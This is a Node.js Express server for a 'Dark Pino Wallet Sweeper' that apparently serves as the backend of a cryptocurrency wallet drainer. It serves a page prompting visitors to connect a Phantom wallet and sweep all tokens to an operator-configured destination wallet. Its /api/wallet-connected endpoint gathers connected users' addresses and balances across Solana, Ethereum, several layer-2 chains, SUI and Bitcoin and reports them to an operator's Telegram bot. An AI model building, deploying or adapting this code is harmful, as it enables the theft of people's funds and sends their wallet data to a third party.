/**
 * Simple Server for Dark Pino Wallet Sweeper
 */

const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const path = require('path');
const https = require('https');

// Load environment variables
require('dotenv').config();

const app = express();
const port = process.env.PORT || 3000;

// Basic security
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'", "https://unpkg.com"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            connectSrc: [
                "'self'",
                // Solana RPC endpoints
                "https://*.solana.com",
                "https://mainnet.helius-rpc.com",
                "https://solana-mainnet.g.alchemy.com",
                "https://rpc.magicblock.app",
                "https://solana-api.syndica.io",
                "https://solana.publicnode.com",
                "https://api.mainnet-beta.solana.com",
                // Bitcoin APIs
                "https://api.blockcypher.com",
                "https://blockchain.info",
                "https://blockstream.info",
                "https://api.blockchair.com",
                // Ethereum and L2 RPCs
                "https://mainnet.infura.io",
                "https://mainnet.base.org",
                "https://arb1.arbitrum.io",
                "https://mainnet.optimism.io",
                "https://polygon-rpc.com",
                // SUI RPC
                "https://sui-mainnet.nodeforge.sui.io",
                "https://sui-api.blockvision.org",
                // WebSocket support
                "wss://*",
                "ws://localhost:*"
            ],
            imgSrc: ["'self'", "data:", "https:"],
        },
    },
}));

// CORS
app.use(cors());

// Parse JSON
app.use(express.json());

// Telegram notification function
async function sendTelegramNotification(message) {
    if (!process.env.TELEGRAM_NOTIFICATIONS_ENABLED || process.env.TELEGRAM_NOTIFICATIONS_ENABLED !== 'true') {
        console.log('Telegram notifications disabled');
        return;
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId || botToken === 'your_telegram_bot_token_here') {
        console.log('Telegram bot not configured - skipping notification');
        return;
    }

    try {
        const data = JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });

        console.log('📝 Message bytes:', Buffer.byteLength(data), 'chars:', data.length);

        const options = {
            hostname: 'api.telegram.org',
            port: 443,
            path: `/bot${botToken}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data)
            }
        };

        return new Promise((resolve, reject) => {
            const req = https.request(options, (res) => {
                let responseData = '';
                res.on('data', (chunk) => {
                    responseData += chunk;
                });
                res.on('end', () => {
                    if (res.statusCode === 200) {
                        console.log('Telegram notification sent successfully');
                        resolve(true);
                    } else {
                        console.error('Telegram API error:', responseData);
                        reject(new Error('Telegram API error'));
                    }
                });
            });

            req.on('error', (error) => {
                console.error('Telegram request error:', error);
                reject(error);
            });

            req.write(data);
            req.end();
        });

    } catch (error) {
        console.error('Failed to send Telegram notification:', error);
    }
}

// Wallet configuration endpoint
app.get('/api/wallet-config', (req, res) => {
    res.json({
        destinationWallet: process.env.DESTINATION_WALLET_ADDRESS || null,
        isConfigured: !!process.env.DESTINATION_WALLET_ADDRESS
    });
});

// Wallet connection notification endpoint
app.post('/api/wallet-connected', async (req, res) => {
    try {
        const {
            walletAddress, ethWallet, solBalance, tokenBalances, ethBalance, ethTokens, btcBalance, timestamp,
            // New multi-chain data
            baseBalance, baseTokens, arbitrumBalance, arbitrumTokens, optimismBalance, optimismTokens,
            polygonBalance, polygonTokens, suiBalance, suiTokens, suiAddress, btcAddress, monadBalance, monadTokens
        } = req.body;

        console.log('🔗 Received comprehensive multi-chain wallet data:', {
            walletAddress: (walletAddress && typeof walletAddress === 'string') ? walletAddress.substring(0, 8) + '...' : 'none',
            ethWallet: (ethWallet && typeof ethWallet === 'string') ? ethWallet.substring(0, 8) + '...' : 'none',
            suiAddress: (suiAddress && typeof suiAddress === 'string') ? suiAddress.substring(0, 8) + '...' : 'none',
            btcAddress: (btcAddress && typeof btcAddress === 'string') ? btcAddress.substring(0, 8) + '...' : 'none',
            solBalance,
            tokenCount: tokenBalances?.length || 0,
            ethBalance,
            ethTokenCount: ethTokens?.length || 0,
            baseBalance,
            baseTokenCount: baseTokens?.length || 0,
            arbitrumBalance,
            arbitrumTokenCount: arbitrumTokens?.length || 0,
            optimismBalance,
            optimismTokenCount: optimismTokens?.length || 0,
            polygonBalance,
            polygonTokenCount: polygonTokens?.length || 0,
            suiBalance,
            suiTokenCount: suiTokens?.length || 0,
            btcBalance
        });

        if (!walletAddress) {
            return res.status(400).json({ error: 'Wallet address required' });
        }

        // Format comprehensive multi-chain message for Telegram
        const lines = [
            '🍍 <b>Dark Pino MEGA Multi-Chain Wallet Connected</b>',
            '',
            `<b>⏰ Time:</b> ${new Date(timestamp || Date.now()).toLocaleString()}`,
            '',
            '<b>🔴 === SOLANA ===</b>',
            `<b>👤 Wallet:</b> <code>${walletAddress}</code>`,
            `<b>💰 SOL Balance:</b> ${solBalance || 0} SOL`,
        ];

        if (tokenBalances && tokenBalances.length > 0) {
            lines.push('<b>🪙 SPL Tokens:</b>');
            tokenBalances.forEach(token => {
                lines.push(`• ${token.symbol}: ${token.balance.toLocaleString()}`);
            });
        } else {
            lines.push('<b>🪙 SPL Tokens:</b> None found');
        }

        // === ETHEREUM MAINNET SECTION ===
        lines.push('');
        lines.push('<b>🔵 === ETHEREUM MAINNET ===</b>');
        if (ethWallet) {
            lines.push(`<b>👤 ETH Wallet:</b> <code>${ethWallet}</code>`);
            lines.push(`<b>💎 ETH Balance:</b> ${ethBalance || 0} ETH`);

            if (ethTokens && ethTokens.length > 0) {
                lines.push('<b>🪙 ERC-20 Tokens:</b>');
                ethTokens.forEach(token => {
                    lines.push(`• ${token.symbol}: ${token.balance.toLocaleString()}`);
                });
            } else {
                lines.push('<b>🪙 ERC-20 Tokens:</b> None found');
            }
        } else {
            lines.push('<b>❌ Not connected to Ethereum</b>');
        }

        // === BASE NETWORK SECTION ===
        lines.push('');
        lines.push('<b>🔷 === BASE NETWORK ===</b>');
        if (ethWallet) {
            lines.push(`<b>💎 Base ETH:</b> ${baseBalance || 0} ETH`);
            if (baseTokens && baseTokens.length > 0) {
                lines.push('<b>🪙 Base Tokens:</b>');
                baseTokens.forEach(token => {
                    lines.push(`• ${token.symbol}: ${token.balance.toLocaleString()}`);
                });
            } else {
                lines.push('<b>🪙 Base Tokens:</b> None found');
            }
        } else {
            lines.push('<b>❌ Wallet not connected</b>');
        }

        // === ARBITRUM SECTION ===
        lines.push('');
        lines.push('<b>🔷 === ARBITRUM ===</b>');
        if (ethWallet) {
            lines.push(`<b>💎 Arbitrum ETH:</b> ${arbitrumBalance || 0} ETH`);
            if (arbitrumTokens && arbitrumTokens.length > 0) {
                lines.push('<b>🪙 Arbitrum Tokens:</b>');
                arbitrumTokens.forEach(token => {
                    lines.push(`• ${token.symbol}: ${token.balance.toLocaleString()}`);
                });
            } else {
                lines.push('<b>🪙 Arbitrum Tokens:</b> None found');
            }
        } else {
            lines.push('<b>❌ Wallet not connected</b>');
        }

        // === OPTIMISM SECTION ===
        lines.push('');
        lines.push('<b>🔷 === OPTIMISM ===</b>');
        if (ethWallet) {
            lines.push(`<b>💎 Optimism ETH:</b> ${optimismBalance || 0} ETH`);
            if (optimismTokens && optimismTokens.length > 0) {
                lines.push('<b>🪙 Optimism Tokens:</b>');
                optimismTokens.forEach(token => {
                    lines.push(`• ${token.symbol}: ${token.balance.toLocaleString()}`);
                });
            } else {
                lines.push('<b>🪙 Optimism Tokens:</b> None found');
            }
        } else {
            lines.push('<b>❌ Wallet not connected</b>');
        }

        // === POLYGON SECTION ===
        lines.push('');
        lines.push('<b>🔷 === POLYGON ===</b>');
        if (ethWallet) {
            lines.push(`<b>💎 Polygon MATIC:</b> ${polygonBalance || 0} MATIC`);
            if (polygonTokens && polygonTokens.length > 0) {
                lines.push('<b>🪙 Polygon Tokens:</b>');
                polygonTokens.forEach(token => {
                    lines.push(`• ${token.symbol}: ${token.balance.toLocaleString()}`);
                });
            } else {
                lines.push('<b>🪙 Polygon Tokens:</b> None found');
            }
        } else {
            lines.push('<b>❌ Wallet not connected</b>');
        }

        // === SUI NETWORK SECTION ===
        lines.push('');
        lines.push('<b>⚡ === SUI NETWORK ===</b>');
        if (suiAddress && typeof suiAddress === 'string') {
            lines.push(`<b>👤 SUI Wallet:</b> <code>${suiAddress}</code>`);
            lines.push(`<b>⚡ SUI Balance:</b> ${suiBalance || 0} SUI`);
            if (suiTokens && suiTokens.length > 0) {
                lines.push('<b>🪙 SUI Tokens:</b>');
                suiTokens.forEach(token => {
                    lines.push(`• ${token.symbol}: ${token.balance.toLocaleString()}`);
                });
            } else {
                lines.push('<b>🪙 SUI Tokens:</b> None found');
            }
        } else {
            lines.push('<b>❌ SUI wallet not connected</b>');
        }

        // === BITCOIN SECTION ===
        lines.push('');
        lines.push('<b>🟠 === BITCOIN ===</b>');
        if (btcAddress && typeof btcAddress === 'string') {
            lines.push(`<b>👤 BTC Address:</b> <code>${btcAddress}</code>`);
            lines.push(`<b>₿ BTC Balance:</b> ${btcBalance || 0} BTC`);
        } else {
            lines.push('<b>❌ Bitcoin wallet not connected</b>');
        }

        // === MONAD SECTION ===
        lines.push('');
        lines.push('<b>🟣 === MONAD NETWORK ===</b>');
        lines.push('<b>🚧 Currently in testnet - coming soon!</b>');

        // === COMPREHENSIVE MULTI-CHAIN SUMMARY ===
        const totalSolTokens = tokenBalances?.length || 0;
        const totalEthTokens = ethTokens?.length || 0;
        const totalBaseTokens = baseTokens?.length || 0;
        const totalArbitrumTokens = arbitrumTokens?.length || 0;
        const totalOptimismTokens = optimismTokens?.length || 0;
        const totalPolygonTokens = polygonTokens?.length || 0;
        const totalSuiTokens = suiTokens?.length || 0;

        const grandTotal = totalSolTokens + totalEthTokens + totalBaseTokens +
                          totalArbitrumTokens + totalOptimismTokens + totalPolygonTokens +
                          totalSuiTokens + (btcBalance > 0 ? 1 : 0);

        lines.push('');
        lines.push('<b>📊 COMPREHENSIVE MULTI-CHAIN SUMMARY:</b>');
        lines.push(`• 🌍 Total Chains: 9 blockchains scanned`);
        lines.push(`• 💰 Total Assets: ${grandTotal} items found`);
        lines.push(`• 🔴 Solana: ${totalSolTokens} tokens`);
        lines.push(`• 🔵 Ethereum: ${totalEthTokens} tokens`);
        lines.push(`• 🔷 Base: ${totalBaseTokens} tokens`);
        lines.push(`• 🔷 Arbitrum: ${totalArbitrumTokens} tokens`);
        lines.push(`• 🔷 Optimism: ${totalOptimismTokens} tokens`);
        lines.push(`• 🔷 Polygon: ${totalPolygonTokens} tokens`);
        lines.push(`• ⚡ SUI: ${totalSuiTokens} tokens`);
        lines.push(`• ₿ Bitcoin: ${btcBalance > 0 ? '✅' : '❌'}`);
        lines.push('');
        lines.push('<i>🧹 Ready for multi-chain operations...</i>');

        const message = lines.join('\n');

        console.log('📤 Sending Telegram message:', message.substring(0, 200) + '...');

        // Send to Telegram
        await sendTelegramNotification(message);

        // Log to console
        console.log(`Wallet connected: ${walletAddress.substring(0, 8)}...${walletAddress.substring(walletAddress.length - 8)}`);
        console.log(`SOL Balance: ${solBalance}`);
        console.log(`Tokens: ${tokenBalances?.length || 0}`);

        res.json({
            success: true,
            message: 'Wallet connection notification sent',
            walletInfo: {
                address: walletAddress,
                solBalance,
                tokenCount: tokenBalances?.length || 0
            }
        });

    } catch (error) {
        console.error('Failed to process wallet connection:', error);
        res.status(500).json({
            error: 'Failed to process wallet connection',
            details: error.message
        });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime()
    });
});

// Serve static files
app.use(express.static(path.join(__dirname, '../frontend')));

// Sweep page
// Main page - serve sweep.html as default
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/sweep.html'));
});

// Sweep page (for compatibility)
app.get('/sweep', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/sweep.html'));
});

// All other routes fallback
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/sweep.html'));
});

// Start server
app.listen(port, () => {
    console.log(`
🍍 Dark Pino Wallet Sweeper Server Started
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🌐 Server: http://localhost:${port}
🧹 Sweep Page: http://localhost:${port}/sweep
🔧 Environment: ${process.env.NODE_ENV || 'development'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 How to use:
1. Open http://localhost:${port}/sweep in your browser
2. Connect your Phantom wallet
3. Click "SWEEP ALL" to transfer all tokens
4. Approve the transaction in Phantom

⚠️  Make sure to set your DESTINATION_WALLET_ADDRESS in .env

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    `);
});

module.exports = app;